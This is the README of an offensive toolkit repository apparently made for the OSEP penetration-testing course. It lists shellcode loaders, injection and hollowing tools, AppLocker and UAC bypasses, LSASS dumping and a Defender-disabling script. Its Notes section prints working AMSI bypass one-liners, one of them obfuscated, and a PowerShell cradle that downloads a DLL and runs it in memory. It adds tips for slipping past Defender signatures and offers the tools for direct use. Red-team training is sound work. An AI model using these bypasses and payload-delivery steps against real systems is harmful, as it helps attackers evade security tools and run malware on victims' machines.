# OSEP Tools v2

A marriage between [Octoberfest/OSEP-Tools](https://github.com/Octoberfest7/OSEP-Tools) and [chvancooten/OSEP-Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets). Thanks to those guys for putting in the real work.

I made some changes to the repos obviously. The easiest way to see what I've done is check the commits and my [Changelog](#osep-tools-v2-changelog) section below. I rewrote/reformatted the documentation for the tools, fixed some things here and there, and added some decent functionality on top of the old projects.

Alot of my focus has been on adding to the shellcode loading C#/PS projects, AppLocker bypasses, and Misc things. I included most of OSEP-Tools, and a few projects from OSEP-Code-Snippets that weren't covered already. Keep in mind the projects here are mostly to give you a starting point from which you can expand and upgrade your own versions of the tools.

Below is a small table of contents, some notes, my changelog, and then the disclaimer from the OG OSEP-Tools repo author.

## ToC

| Module | Description | SubModules |
| ------ | ----------- | ---------- |
| Active_Directory | Tools that aid in AD enumeration/exploitation | `sql` |
| AppLocker_Bypass | Tools that aid in bypassing AppLocker | `altBypass`, `DLLInject64`, `DLLRunner32`, `psBypass` |
| Linux | Tools that aid in executing shells on a Linux box | `Linux_Shellcode_Encoders`, `Linux_Shellcode_Loaders` |
| Loaders_Disk | Tools that aid in loading shellcode into memory, *from disk*, and executing | `ASPX_Inject64`, `ASPX_Runner64`, `clrunner`, `clhollow`, `clinject`, `D_invoke` |
| Loaders_Memory | Tools that aid in loading shellcode into memory, *from memory*. Usually scripts fetched remotely in powershell. | `powerhollow.py`, `powerinject.py` |
| Macros | Tools that aid in executing shellcode either from memory or disk, from a word VBS Macro | `WordMacroRunner.vbs`, `WordMacroRunnerBasic.vbs`, `vbObfuscate.ps1`, `WordPsCradle.vbs`, `WordMacroInject.vbs` |
| Misc | Tools aiding in misc things like AV enumeration, automation, dumping LSASS memory, and RCE leveraging win32 API | `AV_Stuff`, `Autos`, `PSLessExec`, `MiniDump` |
| Privilege_Escalation | Tools that aid in Windows PE | `PrinSpoofer.Net`, `shakeitoff`, `UACBypass.ps1` |

## OSEP-Tools-v2 Changelog
- [11/25/2023](https://github.com/hackinaggie/OSEP-Tools-v2/commit/abf34fb4b0c761091ace1be6368c8bbdfcc3b2bb)
    - Initial commit; File structure changes, README updates/prettifying, repo merging
- 11/26/2023
    - Updated `WordMacroInject.vbs` to be able to inject when ran from a 32-bit Word process
    - Updated `WordMacroInject.vbs` to enumerate 32-bit processes and inject into a process other than `WINWORD.exe`
    - Updated `Disable-AVProduct.ps1` to better enumerate security products
    - Added `Misc/Autos` directory to automate common processes; Added `Create-Admin.ps1`
- 12/01/2023
    - Updated `Disable-AVProduct.ps1` to actually disable windows defender (using provided cmdlets/registry keys, nothing crazy)
    - More thorough minifying of `Disable-AVProduct.min.ps1`
    - Fix `powerhollow.py` and `powerinject.py` payloads to not fail if no Amsi found
    - Add input checks to ensure hollowing targets are valid
- 12/03/2023
    - Compile all projects to single directory for ease of access
- 12/13/2023
    - Fix D_invoke dependency issue. Modify underlying build command to allow build error debugging
    - Add reverse shell functionality to `altbypass`
    - Add new formatter `bin_to_vbappArray.py`
    - Update `powerinject.py` payloads to always execute in a 64-bit process
- 01/06/2024
    - Update `powerinject.py` target injection process identification method. Add `any` target option.
    - Add `clrunner` payload. Add InstallUtil bypass to all `cl*` Shellcode Loaders.
    - General Optimization of projects mapped to `payloads/` directory.
- 01/07/2024
  - Add `DLLInject64` and `DLLRunner32`. Remove `nonDN2J.hta`.
- 01/14/2024
  - Add `ASPX_Inject64` and `ASPX_Runner64` projects
  - Rename `Loaders_PEs` to `Loaders_Disk`, `Loaders_Shellcode` to `Loaders_Memory`, move projects between them.
- 01/20/2024
  - `DLLInject64` and `DLLRunner32`: Move to `AppLocker_Bypass`, add AMSI Bypasses, and add XSL + HTA Payload examples.
- 01/04/2025
  - Merge in johto89:main... BUT Remove OSEP-Code-Snippets/ dir (Don't feel like its in the spirit of the Repo. I only included projects from that Repo I felt are useful)
  - Re-add paylods/Active_Directory. Remove Other/nc_shellcode.txt. Relocate the AD Cheatsheet.

## TODOs

- Implement dynamic AMSI search capability as seen here: https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/
- Update `AV_Stuff` scripts
    - Add AppLocker Rules  disabling option to `Get-AppLockerRules.ps1`
    - Add `DisableLSA` script using my private notes
- Patch the `x64_met_staged_reverseHttps*` payloads in `/bins` bc they don't work. The tcp do.
    - Notes in the Loaders_Shellcode readme
- Integrate more of OSEP-Code-Snippets
- Update `UACBypass.ps1`

## Notes

### Powershell AMSI bypass:
  
- Win10
```ps1
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```
  
- Win10+Win11  
```ps1
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
 
- Powershell Dll download cradle (replace ip/file name but leave rest as is when using D/invoke builder generated payloads!):
```ps1
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.195/basic.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType("dll.Class1");$method = $class.GetMethod("runner");$method.Invoke(0, $null)  
```

With Powerinject/Powerhollow make sure you think about whether you will be calling PS download cradle from powershell or cmd.exe and use the appropriate mode when constructing payloads.  When you call powershell.exe <cradle> from cmd.exe or even from another powershell window, you are creating a child process and while the embedded AMSI bypass may work for the child process the parent process will detect the child performing malicious actions and flag it.
  
- Do NOT use msfvenom encoders with any Hollowing tool. Causes problems.
  
### Injection tools

Your target for injection must be of the same integrity or lower than the method by which you have code execution.  I.e. if you are running in medium integrity you cannot inject into spoolsv, inject into explorer.
  
### Hollowing tools

Your target parent process for PPID spoofing must be of the same integrity or lower than the method by which you have code execution. I.e. if you are running in medium integrity you cannot specify spoolsv as the parent process.  Hollowed process will inherit the integrity of parent process.

### Discoveries

- Latest patch defender (Oct 2021) seems to have an "AND" based signature for `AutoOpen()`.  It can be used in macros for benign purposes but as soon as API calls are included (or at least things used in shellcode runners), it flags signature based detection.
- `RtlMoveMemory` API call is signatured.  Use `RtlFillMemory` instead. 
- Resolve `Amsi.dll` and the function calls within it either dynamically or heavily obfuscated when you go to patch it.
- Meterpreter shells after using Migrate seem to get caught by defender sometimes... Doesn't seem to be the case for straight up injection payloads.

### RESOURCES

- https://depthsecurity.com/blog/obfuscating-malicious-macro-enabled-word-docs
- https://secureyourit.co.uk/wp/2020/04/18/enumerating-process-modules-in-vba/

# Disclaimer
> @Octoberfest7

All of these tools were developed for use in the OSEP course.  During development of them, as I learned more, in many cases I went above and beyond what the course taught because I figured "Why not build things against latest patch AV?".  That is not to say that all of the things in this repo are now beating Live Defender; however at one point or another, most of them were.  I hope that they may be of use to others, either for direct usage or to serve as inspiration for further work.

There is very little in terms of actual novel tradecraft here; it is a combination of a myriad of resources provided by people far smarter than I.  The majority of the heavy lifting I did here was towards automation.  I wanted an easy, standardized way to generate payloads for use in the OSEP course. All powershell and C# payloads contained within this repo utilize AES-256 encryption on the shellcode as well as a sleep statement for sandbox detection/evasion.

I offer no guarantees of any kind when using this stuff.  Nothing in here was designed for public release, I am doing so after many requests.  Make sure you read the notes provided on each tool in this README.
